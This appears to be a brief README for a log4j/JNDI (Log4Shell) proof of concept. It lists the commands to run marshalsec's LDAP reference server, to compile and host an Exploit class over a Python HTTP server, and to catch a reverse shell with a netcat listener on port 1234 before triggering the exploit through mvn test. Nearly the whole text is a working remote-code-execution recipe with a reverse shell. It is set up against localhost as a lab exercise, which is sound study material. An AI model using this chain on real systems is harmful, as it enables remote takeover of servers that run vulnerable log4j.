# jndi/log4j-poc
How to set up marshalsec's LDAP provider server:
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#Exploit

How to set up web server hosting RCE payload:
cd exploit_class
javac Exploit.java #saved in Exploit.class
python3 -m http.server 80

Exploit.java sends a webshell to localhost port 1234.

Finally, nc -lvp 1234 and run mvn test.
